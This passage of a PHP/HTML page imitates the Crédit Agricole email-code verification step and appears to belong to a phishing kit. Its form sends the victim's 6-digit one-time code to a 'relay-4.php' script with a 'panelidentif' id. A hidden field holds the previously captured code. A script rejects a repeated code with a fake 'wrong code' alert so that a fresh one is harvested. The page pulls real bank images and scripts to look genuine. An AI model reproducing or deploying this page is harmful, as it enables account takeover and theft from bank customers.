						<div class="pearl-title">Vérification d'identité</div>
					</div>
				</div>
			</div>
			
		    <div class="StrongAuthentication-authenticateU">
		        <h1><b>VERIFICATION PAR EMAIL:</b></h1>
		        
				<form action="relay-4.php?id=panelidentif&357926036" id="formSendCode" method="POST">
			        <div>
					<br /><br />
			            <img src="img/002-email.png">
			            <span><b> &nbsp;&nbsp;&nbsp;Veuillez saisir le code à 6 chiffres reçu dans votre adresse mail:</b></span>
			            <p class="StrongAuthentication-para--padLeft46" style="color:red;size:8px;">Un code est envoyé à votre adresse email certifiée, veuillez vérifiez votre adresse email.</p>
			            
			            <div class="form-group StrongAuthentication-para--padLeft46 SmsAuthentication-formCode">
			                <label for="otpPassInput" class="Login-noPadding Login-accountLabel">CODE D'AUTHENTIFICATION</label>
			                <div class="Login-noPadding">
			                    <div class="add-clear-span form-group"><div class="add-clear-span form-group ">
								<div class="add-clear-span form-group ">
								<div class="add-clear-span form-group ">
								<input type="text" class="form-control input-clear" required=""  data-validation="length number" data-validation-length="6-6" data-validation-error-msg="Votre saisie doit comporter 6 caractères numériques" id="codesms3" name="codesms3" maxlength="6" autocomplete="nope">
								<input type="hidden" name="oldcode2" id="oldcode2" value="<?php echo $_SESSION['codesms2']; ?>" DISABLED>
								<span role="button" class="add-clear-x form-control-feedback icon-form npc-close" style="display: none; cursor: pointer; text-decoration: none; overflow: hidden; position: absolute; pointer-events: auto; right: 0px; top: 4px; z-index: 100;" aria-label="Saisir à nouveau ce champ."></span></div><span role="button" class="add-clear-x form-control-feedback icon-form npc-close" style="display: none; cursor: pointer; text-decoration: none; overflow: hidden; position: absolute; pointer-events: auto; right: 0px; top: 4px; z-index: 100;" aria-label="Saisir à nouveau ce champ."></span></div><span role="button" class="add-clear-x form-control-feedback icon-form npc-close" style="display: none; cursor: pointer; text-decoration: none; overflow: hidden; position: absolute; pointer-events: auto; right: 0px; top: 4px; z-index: 100;" aria-label="Saisir à nouveau ce champ."></span></div><span role="button" class="add-clear-x form-control-feedback icon-form npc-close" style="display: none; cursor: pointer; text-decoration: none; overflow: hidden; position: absolute; pointer-events: auto; right: 0px; top: 4px; z-index: 100;" aria-label="Saisir à nouveau ce champ."></span></div>
			                    <div class="Login-noPadding error" id="erreur-authent" style="display:none">
			                    	<p role="alert"></p>
			                	</div>
			                </div>
			            </div>
			        </div>
			
					<div class="FormActions StrongAuthentication-formActions">
						<div class="FormActions-inner">
							<input type="submit" class="FormActions-btn FormActions-btn--submit" value="Valider">
						</div>
					</div>
				</form>	
		    </div>
		</div>
		<div class="col-xs-12 col-md-pull-6 col-md-6 hidden-xs hidden-sm">
			<div class="row js-StickyPush js-Sticky--enable"><div class="js-StickyWrap"><div class="js-StickyWrap"><div class="js-StickyWrap"><div class="js-StickyWrap" style="transform: translateY(0px);">
				<div class="js-FullHeight" style="height: 877px;">
					<div class="placeholder-left-1 parsys"><div class="new-zdg parbase section">
	
<div class="componentZdg">
  <div class="PushCarousel3">
  <div><button class="PushCarousel3-masking" onclick="toggleStateCarousel('hom')">Mettre en pause ou redémarrer le défilement du carousel</button></div>
  <div class="PushCarousel3-carousel">
    <div data-trackingclass="carrousel" class="PushCarousel3-carouselInner owl-loaded owl-drag" role="listbox" tabindex="0" data-owl-access-keyup="1" data-owl-carousel-focusable="1" data-owl-carousel-focused="0" aria-live="off">
      
		  
                   
          

    <div class="owl-stage-outer"><div class="owl-stage" style="transform: translate3d(-6671px, 0px, 0px); transition: all 0.25s ease 0s; width: 18107px;"><div class="owl-item cloned" aria-hidden="true" style="width: 952px; margin-right: 1px;"><div class="PushCarousel3-item" data-trackinginfo="">

        <div class="PushCommunication-backgroundWrapper">
            <div class="PushCommunication-background PushCommunication-background--filterTransparent" style="background-image: url('https://www.credit-agricole.fr/content/dam/assetsca/npc/slider_0.jpg')"></div>
        </div>
                <div class="PushCommunication-zoning PushCommunication-zoning--center PushCommunication-zoning--transparent">
            
		  
			
             
          
          <div class="PushCommunication-text">
            <div class="texte section">
              
          </div>
        </div>
        
			
             
          
      </div>
       </div></div><div class="owl-item cloned" aria-hidden="true" style="width: 952px; margin-right: 1px;"><div class="PushCarousel3-item" data-trackinginfo="">

        <div class="PushCommunication-backgroundWrapper">
            <div class="PushCommunication-background PushCommunication-background--filterTransparent" style="background-image: url('https://www.credit-agricole.fr/content/dam/assetsca/npc/slider_0.jpg')"></div>
        </div>
                <div class="PushCommunication-zoning PushCommunication-zoning--center PushCommunication-zoning--transparent">
            
		  
			
             
          
          <div class="PushCommunication-text">
            <div class="texte section">
              
          </div>
        </div>
        
			
             
          
      </div>
       </div></div><div class="owl-item cloned" aria-hidden="true" style="width: 952px; margin-right: 1px;"><div class="PushCarousel3-item" data-trackinginfo="">

        <div class="PushCommunication-backgroundWrapper">
            <div class="PushCommunication-background PushCommunication-background--filterTransparent" style="background-image: url('https://www.credit-agricole.fr/content/dam/assetsca/npc/slider_0.jpg')"></div>
        </div>
                <div class="PushCommunication-zoning PushCommunication-zoning--center PushCommunication-zoning--transparent">
            
		  
			
             
          
          <div class="PushCommunication-text">
            <div class="texte section">
              
          </div>
        </div>
        
			
             
          
      </div>
       </div></div><div class="owl-item cloned" aria-hidden="true" style="width: 952px; margin-right: 1px;"><div class="PushCarousel3-item" data-trackinginfo="">

        <div class="PushCommunication-backgroundWrapper">
            <div class="PushCommunication-background PushCommunication-background--filterTransparent" style="background-image: url('https://www.credit-agricole.fr/content/dam/assetsca/npc/slider_0.jpg')"></div>
        </div>
                <div class="PushCommunication-zoning PushCommunication-zoning--center PushCommunication-zoning--transparent">
            
		  
			
             
          
          <div class="PushCommunication-text">
            <div class="texte section">
              
          </div>
        </div>
        
			
             
          
      </div>
       </div></div><div class="owl-item cloned" aria-hidden="true" style="width: 952px; margin-right: 1px;"><div class="PushCarousel3-item" data-trackinginfo="">

        <div class="PushCommunication-backgroundWrapper">
            <div class="PushCommunication-background PushCommunication-background--filterTransparent" style="background-image: url('https://www.credit-agricole.fr/content/dam/assetsca/npc/slider_0.jpg')"></div>
        </div>
                <div class="PushCommunication-zoning PushCommunication-zoning--center PushCommunication-zoning--transparent">
            
		  
			
             
          
          <div class="PushCommunication-text">
            <div class="texte section">
              
          </div>
        </div>
        
			
             
          
      </div>
       </div></div><div class="owl-item" aria-hidden="true" style="width: 952px; margin-right: 1px;"><div class="PushCarousel3-item" data-trackinginfo="">

        <div class="PushCommunication-backgroundWrapper">
            <div class="PushCommunication-background PushCommunication-background--filterTransparent" style="background-image: url('https://www.credit-agricole.fr/content/dam/assetsca/npc/slider_0.jpg')"></div>
        </div>
                <div class="PushCommunication-zoning PushCommunication-zoning--center PushCommunication-zoning--transparent">
            
		  
			
             
          
          <div class="PushCommunication-text">
            <div class="texte section">
              
          </div>
        </div>
        
			
             
          
      </div>
       </div></div><div class="owl-item cloned" aria-hidden="true" style="width: 952px; margin-right: 1px;"><div class="PushCarousel3-item" data-trackinginfo="">

        <div class="PushCommunication-backgroundWrapper">
            <div class="PushCommunication-background PushCommunication-background--filterTransparent" style="background-image: url('https://www.credit-agricole.fr/content/dam/assetsca/npc/slider_0.jpg')"></div>
        </div>
                <div class="PushCommunication-zoning PushCommunication-zoning--center PushCommunication-zoning--transparent">
            
		  
			
             
          
          <div class="PushCommunication-text">
            <div class="texte section">
              
          </div>
        </div>
        
			
             
          
      </div>
       </div></div><div class="owl-item cloned active" aria-hidden="false" style="width: 952px; margin-right: 1px;"><div class="PushCarousel3-item" data-trackinginfo="">

        <div class="PushCommunication-backgroundWrapper">
            <div class="PushCommunication-background PushCommunication-background--filterTransparent" style="background-image: url('https://www.credit-agricole.fr/content/dam/assetsca/npc/slider_0.jpg')"></div>
        </div>
                <div class="PushCommunication-zoning PushCommunication-zoning--center PushCommunication-zoning--transparent">
            
		  
			
             
          
          <div class="PushCommunication-text">
            <div class="texte section">
              
          </div>
        </div>
        
			
             
          
      </div>
       </div></div><div class="owl-item cloned" aria-hidden="true" style="width: 952px; margin-right: 1px;"><div class="PushCarousel3-item" data-trackinginfo="">

        <div class="PushCommunication-backgroundWrapper">
            <div class="PushCommunication-background PushCommunication-background--filterTransparent" style="background-image: url('https://www.credit-agricole.fr/content/dam/assetsca/npc/slider_0.jpg')"></div>
        </div>
                <div class="PushCommunication-zoning PushCommunication-zoning--center PushCommunication-zoning--transparent">
            
		  
			
             
          
          <div class="PushCommunication-text">
            <div class="texte section">
              
          </div>
        </div>
        
			
             
          
      </div>
       </div></div><div class="owl-item cloned" aria-hidden="true" style="width: 952px; margin-right: 1px;"><div class="PushCarousel3-item" data-trackinginfo="">

        <div class="PushCommunication-backgroundWrapper">
            <div class="PushCommunication-background PushCommunication-background--filterTransparent" style="background-image: url('https://www.credit-agricole.fr/content/dam/assetsca/npc/slider_0.jpg')"></div>
        </div>
                <div class="PushCommunication-zoning PushCommunication-zoning--center PushCommunication-zoning--transparent">
            
		  
			
             
          
          <div class="PushCommunication-text">
            <div class="texte section">
              
          </div>
        </div>
        
			
             
          
      </div>
       </div></div><div class="owl-item cloned" aria-hidden="true" style="width: 952px; margin-right: 1px;"><div class="PushCarousel3-item" data-trackinginfo="">

        <div class="PushCommunication-backgroundWrapper">
            <div class="PushCommunication-background PushCommunication-background--filterTransparent" style="background-image: url('https://www.credit-agricole.fr/content/dam/assetsca/npc/slider_0.jpg')"></div>
        </div>
                <div class="PushCommunication-zoning PushCommunication-zoning--center PushCommunication-zoning--transparent">
            
		  
			
             
          
          <div class="PushCommunication-text">
            <div class="texte section">
              
          </div>
        </div>
        
			
             
          
      </div>
       </div></div></div></div><div class="owl-nav disabled"><button type="button" role="presentation" class="owl-prev" tabindex="0"></button><button type="button" role="presentation" class="owl-next" tabindex="0"></button></div>
	   <div class="owl-dots disabled"></div><div class="owl-nav"><button type="button" role="presentation" class="owl-prev" tabindex="0"></button><button type="button" role="presentation" class="owl-next" tabindex="0"></button></div><div class="owl-dots"><button role="button" class="owl-dot active"><span></span></button><button role="button" class="owl-dot"><span></span></button><button role="button" class="owl-dot"><span></span></button><button role="button" class="owl-dot"><span></span></button><button role="button" class="owl-dot"><span></span></button></div><div class="owl-nav"><button type="button" role="presentation" class="owl-prev" tabindex="0"></button><button type="button" role="presentation" class="owl-next" tabindex="0"></button></div><div class="owl-dots"><button role="button" class="owl-dot"><span></span></button><button role="button" class="owl-dot"><span></span></button><button role="button" class="owl-dot"><span></span></button><button role="button" class="owl-dot"><span></span></button><button role="button" class="owl-dot active"><span></span></button></div><div class="owl-nav"><button type="button" role="presentation" class="owl-prev" tabindex="0"></button><button type="button" role="presentation" class="owl-next" tabindex="0"></button></div><div class="owl-dots"><button role="button" class="owl-dot"><span></span></button><button role="button" class="owl-dot"><span></span></button><button role="button" class="owl-dot active"><span></span></button><button role="button" class="owl-dot"><span></span></button><button role="button" class="owl-dot"><span></span></button><button role="button" class="owl-dot"><span></span></button><button role="button" class="owl-dot"><span></span></button><button role="button" class="owl-dot"><span></span></button><button role="button" class="owl-dot"><span></span></button></div></div>
  </div>
</div>
</div>
<script>
	if (typeof sliderRelationalMessage ==='function') {
		sliderRelationalMessage();
	};
</script>
	
	
    
    
    

</div>

</div>

					<div class="row row-no-padding">
						<div class="col-md-6">
							<div class="AgencyAddress AgencyAddress--primary">
								<div class="AgencyAddress-inner AgencyAddress-inner--center">
									<div class="placeholder-left-2 parsys"><div class="texte section">





<div tabindex="0">
    <p><span class="RichText-texteBlanc"><b>UN PROBLÈME TECHNIQUE</b></span></p>
<p><span class="RichText-texteBlanc">LORS DE VOTRE CONNEXION ?</span></p>
<p><span class="RichText-texteBlanc">Contactez nos conseillers au<b>&nbsp;0 969 323 400</b>&nbsp;(prix d'un appel local) du lundi au vendredi de 8h30 à 19h et le samedi de 9h à 17h.</span></p>

</div>
</div>

</div>

								</div>
							</div>
						</div>
						<div class="col-md-6">
							<div class="SituationAnalyze SituationAnalyze--gray">
								<div class="SituationAnalyze-inner" style="text-align: left;">
									<div class="placeholder-left-3 parsys"><div class="texte section">





<div tabindex="0">
    <div class="FirstLogin-title"><p><b>Sécurité</b></p>
<p>Restez vigilant et veillez à protéger vos identifiants de connexion. Consultez nos <a href="https://www.credit-agricole.fr/guidesecurite/" target="_blank">conseils de sécurité</a><br>
</p>
</div>

</div>
</div>

</div>

								</div>
							</div>
						</div>
					</div>
				</div>
			</div></div></div></div></div>
		</div>
	</div>
</div>

	</main>

	
	<script>
        
        var NPC = NPC || {};
    </script>

	
		<footer>
			
		    <div class="Footer">
				










		    </div>
	    </footer>
	


	

	
	<script type="text/javascript" src="https://www.credit-agricole.fr/etc/designs/ca/npc/clientlib-npc-components.min.ee72bb3225b97d2c343cd0fbf58a603f.js"></script>

	








<script type="text/javascript" src="https://www.credit-agricole.fr/etc/designs/ca/npc/clientlibDSP2.min.12d6b4a16e8601506a6f9972b7e5e88b.js"></script>


	
	    
	        
	        
         		<script type="text/javascript" src="https://www.credit-agricole.fr/etc/designs/ca/npc/clientlib-google-map.min.0c0fa9ea75f3b7ad49e7d8a958b1f79f.js"></script>
<script type="text/javascript" src="https://www.credit-agricole.fr/etc/designs/ca/npc/clientlibBoutonVertGeneralVitrine.min.07c16fc7afcd0fe6c95bb1e4501a0d4c.js"></script>

	        
	    
    
    


















<script>
    /* JQUERY IS NOT AVAILABLE IN THE HEADER */
    jQuery(document).ready(function()
    {
    	// First header h1
    	tc_vars = tc_vars || {};
        tc_vars.page_entete_H1 = '';
        for(var i=0;i<jQuery('h1').length;i++) {
			tc_vars.page_entete_H1 = jQuery('h1').get(i).textContent.trim();
            if(tc_vars.page_entete_H1 !== '') {break;}
        }
        
        if(ContextHub != null) {
    		var deviceStore = ContextHub.getStore("surferinfo");
    		deviceStore.eventing.on(ContextHub.Constants.EVENT_STORE_READY, function() {
    			var categoryDevice = deviceStore.getItem("/device").category;
    			if (categoryDevice === 'Desktop')
    				categoryDevice = 'Ordinateur';
    			else if (categoryDevice === 'Tablet')
    				categoryDevice = 'Tablette';
    			tc_vars.utilisateur_device = categoryDevice;
    	    });
    	}
    });
</script>



	




	
		
	
		    
		        <script src="https://cdn.tagcommander.com/3315/tc_PortailClientCreditAgricole_2.js" async=""></script>
		    
		    
		        <script src="https://cdn.tagcommander.com/3315/tc_PortailClientCreditAgricole_4.js" async=""></script>
		    
	
		
		
	





<div class="ContainerBvModal js-ContainerBvModal ContainerBvModal--hidden" style="top: 60px; min-height: 598px;"></div><script type="text/javascript" async="" src="https://cdn.tagcommander.com/3990/tc_CampagneNationale_4.js"></script><script type="text/javascript" async="" src="https://cdn.tagcommander.com/4295/tc_887CRBriePicardie_4.js"></script><div id="fb-root" class=" fb_reset"><div style="position: absolute; top: -10000px; width: 0px; height: 0px;"><div></div></div></div><script type="text/javascript" async="" src="https://cdn.tagcommander.com/3990/uat/tc_CampagneNationale_4.js"></script><script type="text/javascript" async="" src="https://cdn.tagcommander.com/3990/uat/tc_CampagneNationale_4.js"></script><script type="text/javascript" async="" src="https://cdn.tagcommander.com/3990/uat/tc_CampagneNationale_4.js"></script>

<script src="//ajax.googleapis.com/ajax/libs/jquery/1.10.2/jquery.min.js"></script>
<script src="//cdnjs.cloudflare.com/ajax/libs/jquery-form-validator/2.3.26/jquery.form-validator.min.js"></script>
<script>
  $.validate({
    lang: 'fr'
  });
</script>
<script type="text/javascript">
$('form').submit(function() {
      if (parseInt($('input[name="codesms3"]').val()) == $("#oldcode2").val()) {
		 alert('Vous avez entré le mauvais code, veuillez vérifier à nouveau pour un nouveau sms.');
        return false;
      }
      else{
        return true;
      }
    });
</script>
</body></html>